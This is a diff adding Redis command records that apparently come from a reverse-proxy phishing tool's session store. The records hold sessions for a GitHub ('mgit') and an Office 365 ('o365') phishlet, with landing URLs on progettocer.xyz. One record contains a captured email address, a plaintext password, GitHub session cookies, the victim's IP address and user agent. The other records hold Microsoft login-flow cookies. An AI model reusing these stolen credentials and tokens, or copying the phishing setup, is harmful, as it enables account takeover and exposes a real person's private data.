@@ -1,0 +1,49 @@
+*3
+$3
+set
+$13
+sessions:0:id
+$2
+37
+*3
+$3
+set
+$11
+sessions:36
+$2677
+{"id":36,"phishlet":"mgit","landing_url":"https://progettocer.xyz/cUjUiazh","username":"marziofrancesco11@gmail.com","password":"qeKkab-peffej-6daqwa","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{".github.com":{"color_mode":{"Name":"color_mode","Value":"%7B%22color_mode%22%3A%22auto%22%2C%22light_theme%22%3A%7B%22name%22%3A%22light%22%2C%22color_mode%22%3A%22light%22%7D%2C%22dark_theme%22%3A%7B%22name%22%3A%22dark%22%2C%22color_mode%22%3A%22dark%22%7D%7D","Path":"","HttpOnly":false},"dotcom_user":{"Name":"dotcom_user","Value":"CeraudoTesi","Path":"","HttpOnly":true},"logged_in":{"Name":"logged_in","Value":"yes","Path":"","HttpOnly":true}},"github.com":{"__Host-user_session_same_site":{"Name":"__Host-user_session_same_site","Value":"OUnW8N5yecdQIm0mdb7_Vnwgv0UwNqO0Tz6Dkwk4fbDUAERz","Path":"","HttpOnly":true},"_gh_sess":{"Name":"_gh_sess","Value":"fPtSzg324dWufVNkN5vGRyfXjBPTqYc6JZbYBOI6Ay91ogd2YD8L8ZGlZqEeaxQ2jx5k%2FNg1Xm6I%2BbYe8Gjt2mYtHhwW3%2FMzq2z0P3HXZUc6SrGhbkTfpwDOVmbrpEhFJSEhp7%2FkgfIKY%2BoBM8U4Qjue3oGQCdcQBAOW%2Fo%2B3k8vzAo3Oqj%2BIfAmm7TM7EXmJZLoNJyUqmlhYHjzpuN0bi8omoAjcFE%2Fn793k0GWNA49ys9ufWkFbjqmMBN90rG%2FYOdbawNPmteHCVv%2Fym9QqAwE5c4eBcBje70cnqVlIPYosE03GaHXnAFHpxEjIkhcYwxfxtJY9sb%2F2PDsje8sHl8VBjaglucH75AAWdy9K%2BSIZK4OwBx66mHGJGnztmm0E%2BlLREsS4QBALUEeva8Aay88y0vx19vON2%2FMDe789qFkelZElNL1uYZktCnD2tXp1fTln%2Bu3C%2F7JjW9JuvHolGpsnBOFCVt0t48iawNnZQbBMWWuBktCPdVctLGA5yLjWgUsfhXtOOs%2BFX6eAy80uvAE4kr0y2n5pCv8FL7ZKqTIBIExYr0WZuyGLRtmadORAld5JCsotUF5413BJ%2FUT92EjsJjsq1hs6teNZiYqps98QZ43UMJXdTcUyw2SV4SaYHtXbbA49WU9O3RhpTg9sGpUEkpnZ3AlHkY4EcPVNotsuTfODj%2BgdVzRPCh0%2FxJMrQtgq6Qukk0LDgS2GwQo7vMU8w9z%2BZJUJvKJ%2FGb7EkEGE6Ylxw0lTuI7IkvT0CFJtb6LsbTrWdXN95pDazhbvjX4wespyIdBNx5C5hnLh2QNN4bE2pdbyTVFg55im1etoRZq52EQhkJJlI64WGYyPkvJjFgIz1EYpymt04y8iR4B9Od4NKT%2FiUcH4HyB%2FouzoJwNrFrqZTj9BhYeyuj7KipzQuWmAP0KGzq4zov8kQFK8MvubSTmeW4OOHsx3PTQBKbzZv09T9ZP4jjULFMmI%2FkXk55U8TdnIq%2BuWP8dgGsDMK0zGro12vOwmxUKm85SceZItaFQEy1q6LLcFsgUZ5hinscxI%2BXHZTl44KRSnBGlRU0dkIIsbqFVhkL0u28fo1L6XlA%3D%3D--Oe5Ie%2FexkolFhef6--MvHC98sKOG%2FCs1FiLCsEcw%3D%3D","Path":"/","HttpOnly":true},"saved_user_sessions":{"Name":"saved_user_sessions","Value":"232176351%3AOUnW8N5yecdQIm0mdb7_Vnwgv0UwNqO0Tz6Dkwk4fbDUAERz","Path":"","HttpOnly":true},"user_session":{"Name":"user_session","Value":"OUnW8N5yecdQIm0mdb7_Vnwgv0UwNqO0Tz6Dkwk4fbDUAERz","Path":"","HttpOnly":true}}},"session_id":"5119f6fc61f853c555030d1fec8fb8f538b8b1bd6c921662f4b3d7a2cd36d9f1","useragent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15","remote_addr":"176.201.175.185","create_time":1757878117,"update_time":1757878426}
+*3
+$3
+set
+$13
+sessions:0:id
+$2
+38
+*3
+$3
+set
+$11
+sessions:37
+$462
+{"id":37,"phishlet":"o365","landing_url":"https://login.progettocer.xyz/PoHHtlVf","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{},"session_id":"06d6da2b2942a852863ed62ef2d244ffa7d2574a55c8007e03ade797ed105c88","useragent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15","remote_addr":"176.201.175.185","create_time":1757878702,"update_time":1757878702}
+*3
+$3
+set
+$11
+sessions:37
+$585
+{"id":37,"phishlet":"o365","landing_url":"https://login.progettocer.xyz/PoHHtlVf","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{"login.microsoftonline.com":{"x-ms-gateway-slice":{"Name":"x-ms-gateway-slice","Value":"estsfd","Path":"","HttpOnly":true}}},"session_id":"06d6da2b2942a852863ed62ef2d244ffa7d2574a55c8007e03ade797ed105c88","useragent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15","remote_addr":"176.201.175.185","create_time":1757878702,"update_time":1757878703}
+*3
+$3
+set
+$11
+sessions:37
+$585
+{"id":37,"phishlet":"o365","landing_url":"https://login.progettocer.xyz/PoHHtlVf","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{"login.microsoftonline.com":{"x-ms-gateway-slice":{"Name":"x-ms-gateway-slice","Value":"estsfd","Path":"","HttpOnly":true}}},"session_id":"06d6da2b2942a852863ed62ef2d244ffa7d2574a55c8007e03ade797ed105c88","useragent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15","remote_addr":"176.201.175.185","create_time":1757878702,"update_time":1757878703}
+*3
+$3
+set
+$11
+sessions:37
+$585
+{"id":37,"phishlet":"o365","landing_url":"https://login.progettocer.xyz/PoHHtlVf","username":"","password":"","custom":{},"body_tokens":{},"http_tokens":{},"tokens":{"login.microsoftonline.com":{"x-ms-gateway-slice":{"Name":"x-ms-gateway-slice","Value":"estsfd","Path":"","HttpOnly":true}}},"session_id":"06d6da2b2942a852863ed62ef2d244ffa7d2574a55c8007e03ade797ed105c88","useragent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15","remote_addr":"176.201.175.185","create_time":1757878702,"update_time":1757878703}
